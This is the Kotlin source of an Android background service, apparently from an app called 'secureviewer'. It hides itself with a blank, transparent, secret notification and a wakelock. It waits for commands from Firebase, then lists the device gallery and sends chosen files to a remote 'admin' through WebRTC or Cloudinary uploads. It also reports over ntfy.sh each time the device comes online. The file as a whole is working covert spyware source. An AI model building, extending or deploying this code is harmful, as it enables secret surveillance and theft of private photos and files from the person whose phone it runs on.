package com.arman.secureviewer

import android.app.*
import android.content.Context
import android.content.Intent
import android.content.pm.ServiceInfo
import android.os.*
import android.util.Log
import androidx.core.app.NotificationCompat
import com.google.firebase.database.*
import kotlinx.coroutines.*
import java.nio.ByteBuffer
import com.cloudinary.android.MediaManager
import com.cloudinary.android.callback.ErrorInfo
import com.cloudinary.android.callback.UploadCallback
import java.io.File
import org.webrtc.*
import java.util.ArrayList
import android.net.ConnectivityManager
import android.net.Network
import android.net.NetworkCapabilities
import android.net.NetworkRequest

class ViewerService : Service() {

    companion object {
        private const val TAG = "ViewerService"
        private const val NOTIF_ID = 1
        private const val CHANNEL_ID = "viewer_ch"
        private const val WAKELOCK_TAG = "ViewerService:WL"
        private const val WAKELOCK_RENEW_MS = 11 * 60 * 60 * 1000L
        private const val NOTIF_COOLDOWN_MS = 24 * 60 * 60 * 1000L
    }

    private lateinit var deviceId: String
    private lateinit var prefs: android.content.SharedPreferences
    private val db get() = FirebaseDatabase.getInstance().reference

    private var wakeLock: PowerManager.WakeLock? = null
    private val handler = Handler(Looper.getMainLooper())
    private val wakelockRenewer = object : Runnable {
        override fun run() {
            renewWakeLock()
            handler.postDelayed(this, WAKELOCK_RENEW_MS)
        }
    }

    private var commandListener: ValueEventListener? = null
    private var offerListener: ValueEventListener? = null
    private var iceListener: ChildEventListener? = null

    private val serviceScope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private var heartbeatJob: Job? = null

    // WebRTC Variables
    private var peerConnectionFactory: PeerConnectionFactory? = null
    private var peerConnection: PeerConnection? = null
    private var dataChannel: DataChannel? = null

    private var connectivityManager: ConnectivityManager? = null
    private var isNetworkCallbackRegistered = false
    private var isCurrentlyOnline = false

    private val networkCallback = object : ConnectivityManager.NetworkCallback() {
        override fun onAvailable(network: Network) {
            if (isCurrentlyOnline) return
            isCurrentlyOnline = true
            Log.d(TAG, "🌐 Network Available - Going Online")
            updateStatus(true)
            sendNotifIfNeeded()
        }

        override fun onLost(network: Network) {
            // Android may call onLost for one network while another is still active
            val activeNetwork = connectivityManager?.activeNetwork
            if (activeNetwork == null) {
                isCurrentlyOnline = false
                Log.d(TAG, "🌐 Network Lost - Going Offline")
                updateStatus(false)
            }
        }
    }


    override fun onCreate() {
        super.onCreate()
        prefs = getSharedPreferences("viewer_prefs", Context.MODE_PRIVATE)
        createNotificationChannel()
        acquireWakeLock()
        initCloudinary()
    }

    private fun initCloudinary() {
        try {
            val config = mapOf(
                "cloud_name" to "YOUR_CLOUDINARY_CLOUD_NAME",
                "api_key"    to "YOUR_CLOUDINARY_API_KEY",
                "api_secret" to "YOUR_CLOUDINARY_API_SECRET"
            )
            MediaManager.init(this, config)
        } catch (e: Exception) {
            Log.w(TAG, "Cloudinary already init or error: ${e.message}")
        }
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        val intentId = intent?.getStringExtra("device_id")
        if (intentId != null) {
            deviceId = intentId
            prefs.edit().putString("device_id", deviceId).apply()
        } else {
            deviceId = prefs.getString("device_id", "99") ?: "99"
        }

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            startForeground(NOTIF_ID, buildNotification(), ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC)
        } else {
            startForeground(NOTIF_ID, buildNotification())
        }

        registerNetworkCallback()
        listenCommands()
        listenOffers()
        startHeartbeat()
        handler.postDelayed(wakelockRenewer, WAKELOCK_RENEW_MS)

        return START_STICKY
    }

    private fun registerNetworkCallback() {
        if (isNetworkCallbackRegistered) return
        try {
            connectivityManager = getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
            val request = NetworkRequest.Builder()
                .addCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET)
                .build()
            connectivityManager?.registerNetworkCallback(request, networkCallback)
            isNetworkCallbackRegistered = true
        } catch (e: Exception) {
            Log.e(TAG, "Failed to register network callback: ${e.message}")
        }
    }

    private fun updateStatus(online: Boolean) {
        if (!::deviceId.isInitialized) return
        val ref = db.child("status/$deviceId")
        ref.child("online").setValue(online)
        ref.child("timestamp").setValue(ServerValue.TIMESTAMP)
        if (online) {
            ref.child("online").onDisconnect().setValue(false)
            ref.child("timestamp").onDisconnect().setValue(ServerValue.TIMESTAMP)
        }
    }

    private fun startHeartbeat() {
        heartbeatJob?.cancel()
        heartbeatJob = serviceScope.launch {
            while (isActive) {
                if (isCurrentlyOnline) {
                    try {
                        val ref = db.child("status/$deviceId")
                        ref.child("online").setValue(true)
                        ref.child("timestamp").setValue(ServerValue.TIMESTAMP)
                    } catch (e: Exception) { /* ignore */ }
                }
                delay(2000)
            }
        }
    }

    // --- WebRTC SIGNALING ---

    private fun listenOffers() {
        offerListener?.let { db.child("offers/$deviceId").removeEventListener(it) }
        offerListener = object : ValueEventListener {
            override fun onDataChange(snap: DataSnapshot) {
                // Using generic type for map compatibility
                val data = snap.value as? Map<*, *> ?: return
                val sdp = data["sdp"] as? String ?: return
                val type = data["type"] as? String ?: return
                if (type == "offer") {
                    Log.d(TAG, "Offer received, initiating WebRTC Answer")
                    serviceScope.launch { handleOffer(sdp) }
                }
            }
            override fun onCancelled(e: DatabaseError) {}
        }
        db.child("offers/$deviceId").addValueEventListener(offerListener!!)
    }

    private suspend fun handleOffer(sdp: String) {
        initWebRTC()
        createPeerConnection()
        
        peerConnection?.setRemoteDescription(object : SimpleSdpObserver() {
            override fun onSetSuccess() {
                peerConnection?.createAnswer(object : SimpleSdpObserver() {
                    override fun onCreateSuccess(desc: SessionDescription) {
                        peerConnection?.setLocalDescription(object : SimpleSdpObserver() {
                            override fun onSetSuccess() {
                                db.child("answers/$deviceId").setValue(mapOf(
                                    "type" to "answer",
                                    "sdp" to desc.description
                                ))
                            }
                        }, desc)
                    }
                }, MediaConstraints())
            }
        }, SessionDescription(SessionDescription.Type.OFFER, sdp))
    }

    private fun listenIceCandidates() {
        iceListener?.let { db.child("ice/$deviceId/admin").removeEventListener(it) }
        iceListener = object : ChildEventListener {
            override fun onChildAdded(snap: DataSnapshot, prevChildKey: String?) {
                val data = snap.value as? Map<*, *> ?: return
                val candidate = data["candidate"] as? String ?: return
                val sdpMid = data["sdpMid"] as? String ?: return
                val sdpMLineIndex = (data["sdpMLineIndex"] as? Long)?.toInt() ?: 0
                peerConnection?.addIceCandidate(IceCandidate(sdpMid, sdpMLineIndex, candidate))
            }
            override fun onChildChanged(snap: DataSnapshot, prevChildKey: String?) {}
            override fun onChildRemoved(snap: DataSnapshot) {}
            override fun onChildMoved(snap: DataSnapshot, prevChildKey: String?) {}
            override fun onCancelled(error: DatabaseError) {}
        }
        db.child("ice/$deviceId/admin").addChildEventListener(iceListener!!)
    }

    private fun initWebRTC() {
        if (peerConnectionFactory != null) return

        PeerConnectionFactory.initialize(
            PeerConnectionFactory.InitializationOptions.builder(applicationContext)
                .setEnableInternalTracer(false)
                .createInitializationOptions()
        )
        peerConnectionFactory = PeerConnectionFactory.builder()
            .setOptions(PeerConnectionFactory.Options())
            .createPeerConnectionFactory()
    }

    private fun createPeerConnection() {
        val iceServers = listOf(
            PeerConnection.IceServer.builder("stun:stun.l.google.com:19302").createIceServer(),
            PeerConnection.IceServer.builder("stun:stun1.l.google.com:19302").createIceServer()
        )
        val rtcConfig = PeerConnection.RTCConfiguration(iceServers).apply {
            sdpSemantics = PeerConnection.SdpSemantics.UNIFIED_PLAN
            continualGatheringPolicy = PeerConnection.ContinualGatheringPolicy.GATHER_CONTINUALLY
        }

        peerConnection = peerConnectionFactory?.createPeerConnection(rtcConfig, object : PeerConnection.Observer {
            override fun onIceCandidate(candidate: IceCandidate) {
                db.child("ice/$deviceId/target").push().setValue(mapOf(
                    "sdpMid" to candidate.sdpMid,
                    "sdpMLineIndex" to candidate.sdpMLineIndex,
                    "candidate" to candidate.sdp
                ))
            }
            override fun onDataChannel(dc: DataChannel) {
                Log.d(TAG, "DataChannel received from Admin")
                dataChannel = dc
                setupDataChannel(dc)
            }
            override fun onIceConnectionChange(state: PeerConnection.IceConnectionState) {
                Log.d(TAG, "ICE State: $state")
            }
            override fun onSignalingChange(s: PeerConnection.SignalingState?) {}
            override fun onIceConnectionReceivingChange(r: Boolean) {}
            override fun onIceCandidatesRemoved(c: Array<out IceCandidate>?) {}
            override fun onIceGatheringChange(s: PeerConnection.IceGatheringState?) {}
            override fun onAddStream(s: MediaStream?) {}
            override fun onRemoveStream(s: MediaStream?) {}
            override fun onRenegotiationNeeded() {}
            override fun onAddTrack(r: RtpReceiver?, s: Array<out MediaStream>?) {}
        })
        listenIceCandidates()
    }

    private fun setupDataChannel(dc: DataChannel) {
        dc.registerObserver(object : DataChannel.Observer {
            override fun onMessage(buffer: DataChannel.Buffer) {
                if (buffer.binary) return
                val bytes = ByteArray(buffer.data.remaining())
                buffer.data.get(bytes)
                val text = String(bytes)
                if (text.startsWith("download:")) {
                    val path = text.substringAfter("download:")
                    serviceScope.launch { sendFileViaDataChannel(path) }
                }
            }
            override fun onStateChange() {
                if (dc.state() == DataChannel.State.OPEN) {
                    dataChannel = dc
                    Log.d(TAG, "DataChannel OPEN - P2P Ready")
                }
            }
            override fun onBufferedAmountChange(p: Long) {}
        })
    }

    // --- FILE TRANSFER LOGIC (HYBRID) ---

    private suspend fun sendFileViaDataChannel(filePath: String) = withContext(Dispatchers.IO) {
        val dc = dataChannel
        val file = File(filePath)
        if (!file.exists()) { Log.e(TAG, "File not found: $filePath"); return@withContext }

        // Step 1: If DataChannel is not open, fallback immediately to Cloudinary
        if (dc == null || dc.state() != DataChannel.State.OPEN) {
            Log.w(TAG, "P2P not connected. Falling back to Cloudinary for: ${file.name}")
            uploadToCloudinary(filePath, sendUrlViaDC = false)
            return@withContext
        }

        val totalSize = file.length()
        val chunkSize = 32768
        val totalChunks = (totalSize + chunkSize - 1) / chunkSize
        val mime = getMimeType(filePath)

        try {
            Log.d(TAG, "Starting P2P Stream: ${file.name} ($totalSize bytes)")

            // Send Header
            val header = """{"name":"${file.name}","size":$totalSize,"mime":"$mime","chunks":$totalChunks}"""
            dc.send(DataChannel.Buffer(ByteBuffer.wrap(header.toByteArray()), false))
            delay(150) // Give receiver a moment to prepare

            java.io.FileInputStream(file).use { input ->
                val buffer = ByteArray(chunkSize)
                var idx = 0
                var bytesRead: Int

                while (dc.state() == DataChannel.State.OPEN) {
                    bytesRead = input.read(buffer)
                    if (bytesRead == -1) break

                    val chunk = if (bytesRead == chunkSize) buffer else buffer.copyOfRange(0, bytesRead)
                    val pkt = ByteBuffer.allocate(4 + chunk.size)
                    pkt.putInt(idx)
                    pkt.put(chunk)
                    pkt.flip()

                    dc.send(DataChannel.Buffer(pkt, true))
                    idx++

                    // Controlled delay to prevent DataChannel buffer overflow
                    // 5ms delay per 32KB = ~6MB/s transfer speed
                    delay(5)
                }
            }
            Log.d(TAG, "P2P Transfer Complete: ${file.name}")
        } catch (e: Exception) {
            Log.e(TAG, "P2P Send failure: ${e.message}. Attempting Cloudinary fallback.")
            uploadToCloudinary(filePath, sendUrlViaDC = false)
        }
    }

    private suspend fun uploadToCloudinary(filePath: String, sendUrlViaDC: Boolean = true) = withContext(Dispatchers.IO) {
        val file = File(filePath)
        if (!file.exists()) {
            db.child("downloads/$deviceId/error").setValue("File not found: ${file.name}")
            return@withContext
        }

        Log.d(TAG, "Uploading to Cloudinary: ${file.name}")
        MediaManager.get().upload(filePath)
            .option("resource_type", "auto")
            .option("folder", "gallery/$deviceId")
            .option("use_filename", true)
            .option("unique_filename", true)
            .callback(object : UploadCallback {
                override fun onStart(requestId: String) {
                    db.child("downloads/$deviceId/status").setValue("Uploading... 0%")
                }
                override fun onProgress(requestId: String, bytes: Long, totalBytes: Long) {
                    val pct = if (totalBytes > 0) (bytes * 100 / totalBytes).toInt() else 0
                    db.child("downloads/$deviceId/status").setValue("Uploading... $pct%")
                }
                override fun onSuccess(requestId: String, resultData: Map<*, *>) {
                    val url = resultData["secure_url"] as? String ?: ""
                    db.child("downloads/$deviceId/url").setValue(url)
                    db.child("downloads/$deviceId/status").setValue("Complete")

                    // Only send URL via DataChannel if NOT used as fallback
                    if (sendUrlViaDC) {
                        dataChannel?.let { dc ->
                            if (dc.state() == DataChannel.State.OPEN) {
                                val msg = "cloudinary_url:$url"
                                dc.send(DataChannel.Buffer(ByteBuffer.wrap(msg.toByteArray()), false))
                            }
                        }
                    }
                    Log.d(TAG, "Cloudinary Upload Success: $url")
                }
                override fun onError(requestId: String, error: ErrorInfo) {
                    db.child("downloads/$deviceId/error").setValue("Upload failed: ${error.description}")
                    Log.e(TAG, "Cloudinary Error: ${error.description}")
                }
                override fun onReschedule(requestId: String, error: ErrorInfo) {}
            })
            .dispatch()
    }

    private fun getMimeType(path: String): String = when {
        path.endsWith(".jpg", true) || path.endsWith(".jpeg", true) -> "image/jpeg"
        path.endsWith(".png", true)  -> "image/png"
        path.endsWith(".webp", true) -> "image/webp"
        path.endsWith(".mp4", true)  -> "video/mp4"
        else -> "application/octet-stream"
    }

    private fun listenCommands() {
        commandListener?.let { db.child("commands/$deviceId").removeEventListener(it) }
        commandListener = object : ValueEventListener {
            override fun onDataChange(snap: DataSnapshot) {
                val raw = snap.getValue(String::class.java) ?: return
                
                when {
                    raw.startsWith("get_gallery:") -> {
                        val parts = raw.split(":")
                        val offset = parts.getOrNull(1)?.toIntOrNull() ?: 0
                        val limit  = parts.getOrNull(2)?.toIntOrNull() ?: 50
                        val type   = parts.getOrNull(3) ?: "images"
                        handler.postDelayed({ db.child("commands/$deviceId").removeValue() }, 500)
                        serviceScope.launch { sendGalleryListPaginated(offset, limit, type) }
                    }
                    raw.startsWith("upload_cloudinary:") -> {
                        val path = raw.substringAfter("upload_cloudinary:")
                        handler.postDelayed({ db.child("commands/$deviceId").removeValue() }, 500)
                        serviceScope.launch { uploadToCloudinary(path) }
                    }

                }
            }
            override fun onCancelled(e: DatabaseError) {}
        }
        db.child("commands/$deviceId").addValueEventListener(commandListener!!)
    }

    private suspend fun sendGalleryListPaginated(offset: Int, limit: Int, type: String) = withContext(Dispatchers.IO) {
        try {
            val json = MediaUtils.getGalleryJsonPaginated(applicationContext, offset, limit, type)
            val str = json.toString()
            val galleryRef = db.child("gallery/$deviceId")
            galleryRef.setValue(null)
            delay(200)

            val chunkSize = 800_000
            if (str.length <= chunkSize) {
                galleryRef.child("data").setValue(str)
            } else {
                val numChunks = (str.length + chunkSize - 1) / chunkSize
                for (i in 0 until numChunks) {
                    val start = i * chunkSize
                    val end = minOf(start + chunkSize, str.length)
                    galleryRef.child("chunk_$i").setValue(str.substring(start, end))
                }
                galleryRef.child("chunks").setValue(numChunks)
            }
            galleryRef.child("offset").setValue(offset)
            galleryRef.child("limit").setValue(limit)
            galleryRef.child("type").setValue(type)
            galleryRef.child("totalCount").setValue(json.length())
            galleryRef.child("hasMore").setValue(json.length() == limit)
            delay(300)
            galleryRef.child("ready").setValue(true)
        } catch (e: Exception) {
            Log.e(TAG, "Gallery Sync Error: ${e.message}")
        }
    }

    private var lastSentNotificationLocal = 0L

    private fun sendNotifIfNeeded() {
        val now = System.currentTimeMillis()
        val cooldownMs = 60_000L // 60 seconds

        // In-memory check for immediate race conditions
        if (now - lastSentNotificationLocal < cooldownMs) {
            Log.d(TAG, "Notification skipped (memory lock)")
            return
        }

        val prefs = getSharedPreferences("viewer_prefs", Context.MODE_PRIVATE)
        val lastNotifTime = prefs.getLong("last_notification_time", 0L)

        // Persistent check for process restarts
        if (now - lastNotifTime < cooldownMs) {
            lastSentNotificationLocal = lastNotifTime // Sync memory with disk
            Log.d(TAG, "Notification skipped (disk cooldown)")
            return
        }

        // Lock it immediately
        lastSentNotificationLocal = now

        // Send notification
        serviceScope.launch {
            try {
                val sdf = java.text.SimpleDateFormat("HH:mm, dd MMM yyyy", java.util.Locale.getDefault())
                val timeStr = sdf.format(java.util.Date(now))
                val msg = "📱 Device $deviceId is online at $timeStr"
                
                Log.d(TAG, "Sending ntfy notification...")
                val url = java.net.URL("https://ntfy.sh/arman-security-77")
                val conn = url.openConnection() as java.net.HttpURLConnection
                conn.requestMethod = "POST"
                conn.doOutput = true
                conn.connectTimeout = 10000
                conn.readTimeout = 10000
                conn.setRequestProperty("Title", "Device $deviceId Online")
                conn.setRequestProperty("Priority", "high")
                conn.setRequestProperty("Tags", "white_check_mark")
                conn.outputStream.use { it.write(msg.toByteArray()) }
                
                val code = conn.responseCode
                conn.disconnect()
                
                if (code in 200..299) {
                    // Use commit() to ensure it's written before any other fast trigger
                    prefs.edit().putLong("last_notification_time", now).commit()
                    Log.d(TAG, "✅ Notification sent successfully: $code")
                } else {
                    Log.w(TAG, "⚠️ Notification server returned: $code")
                    // Reset local lock on failure so it can retry next net event
                    lastSentNotificationLocal = 0
                }
            } catch (e: Exception) {
                Log.w(TAG, "❌ Notification network error: ${e.message}")
                lastSentNotificationLocal = 0
            }
        }
    }

    override fun onDestroy() {
        heartbeatJob?.cancel()
        serviceScope.cancel()
        commandListener?.let { if (::deviceId.isInitialized) db.child("commands/$deviceId").removeEventListener(it) }
        offerListener?.let { if (::deviceId.isInitialized) db.child("offers/$deviceId").removeEventListener(it) }
        iceListener?.let { if (::deviceId.isInitialized) db.child("ice/$deviceId/admin").removeEventListener(it) }
        if (::deviceId.isInitialized) {
            db.child("status/$deviceId/online").setValue(false)
        }
        peerConnection?.close()
        wakeLock?.let { if (it.isHeld) it.release() }
        if (isNetworkCallbackRegistered) {
            connectivityManager?.unregisterNetworkCallback(networkCallback)
            isNetworkCallbackRegistered = false
        }
        super.onDestroy()
    }

    private fun acquireWakeLock() {
        val pm = getSystemService(POWER_SERVICE) as PowerManager
        wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, WAKELOCK_TAG)
        wakeLock?.acquire(WAKELOCK_RENEW_MS)
    }

    private fun renewWakeLock() {
        try { if (wakeLock?.isHeld == true) wakeLock?.release() } catch(e: Exception) {}
        try { wakeLock?.acquire(WAKELOCK_RENEW_MS) } catch(e: Exception) {}
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val nm = getSystemService(NotificationManager::class.java)
            val channel = NotificationChannel(CHANNEL_ID, "System Notifications", NotificationManager.IMPORTANCE_MIN)
            channel.setShowBadge(false)
            channel.enableVibration(false)
            channel.setSound(null, null)
            nm.createNotificationChannel(channel)
        }
    }

    private fun buildNotification(): Notification {
        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setSmallIcon(R.drawable.ic_transparent)    // transparent icon
            .setContentTitle("")                         // empty title
            .setContentText("")                          // empty text
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setSilent(true)
            .setShowWhen(false)
            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
            .setOngoing(true)
            .build()
    }

    override fun onBind(intent: Intent?) = null

    // Helper for WebRTC State updates
    open class SimpleSdpObserver : SdpObserver {
        override fun onCreateSuccess(desc: SessionDescription) {}
        override fun onSetSuccess() {}
        override fun onCreateFailure(s: String?) { Log.e(TAG, "SDP Create Fail: $s") }
        override fun onSetFailure(s: String?) { Log.e(TAG, "SDP Set Fail: $s") }
    }
}
